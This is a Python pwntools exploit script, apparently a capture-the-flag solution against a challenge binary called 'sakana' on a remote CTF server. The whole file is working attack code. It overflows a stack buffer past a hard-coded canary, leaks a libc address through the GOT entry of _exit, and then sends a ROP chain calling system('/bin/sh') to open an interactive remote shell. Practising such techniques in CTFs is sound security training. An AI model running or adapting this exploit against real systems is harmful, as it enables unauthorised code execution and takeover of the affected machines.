
from pwn import *



libc=ELF('./pwn/sakana/libc-2.31.so')
elf=context.binary=ELF('./pwn/sakana/sakana')
r=remote('ctf.adl.tw',10003)


#data_from_server=r.recvlines(29)
#for l in data_from_server:
#    pass
#    print(l.decode())
pop_rdi=0x00000000000023a3#found in binary by ropper
ret=0x000000000000101a#also found by ropper, for stack alignment

canary=b'\x0a\x00\x00\x00\x00\x00\x00\x00'#I found the canary by brute force in guess.py

#the 1st payload finds the libc base address

r.sendline(b'printf')
r.sendline(b'hi')
data_from_server=r.recvuntil(b'~> ')
print(data_from_server.decode())#Welcome to fish, the friendly interactive shell!
data_from_server=r.recvuntil(b'~> ')
print(data_from_server.decode())#hi

r.sendline(b'printf')
r.sendline(b'A'*264+canary+8*b'a'+flat(elf.got._exit,elf.plt._exit))
data_from_server=r.recvuntil(b'~> ')
print(data_from_server.decode())#lets what we got here



got_exit=unpack(r.recvline()[:6].ljust(8,b'\x00'))
print('leaked got got_exit: %x'%got_exit)


libc.address=got_exit-libc.symbols._exit
print('libc base %x'%libc.address)

#the 2nd payload opens the bin/sh


r.sendline(b'printf')
r.sendline(b'A'*264+canary+8*b'a'+flat(pop_rdi,next(libc.search(b'/bin/sh\x00')),ret,libc.symbols.system))

data_from_server=r.recvuntil(b'~> ')
print(data_from_server.decode())#Welcome to fish, the friendly interactive shell!
r.interactive()
